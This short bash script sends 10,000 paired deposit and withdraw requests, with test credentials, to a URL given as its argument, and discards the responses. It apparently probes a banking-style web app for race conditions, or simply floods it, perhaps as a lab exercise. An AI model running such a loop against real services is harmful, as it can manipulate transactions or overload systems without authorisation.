#!/bin/bash

URL=$1
METHOD="GET"
COOKIE=""
DATA='user=test&pass=pass'


echo url:$URL, method:$METHOD, data:$DATA

for i in {1..10000}
do
    PAYLOAD="&amount=1"
    curl -X $METHOD "$URL?$DATA$PAYLOAD&drop=deposit" >/dev/null 2>/dev/null
    curl -X $METHOD "$URL?$DATA$PAYLOAD&drop=withdraw" >/dev/null 2>/dev/null
done
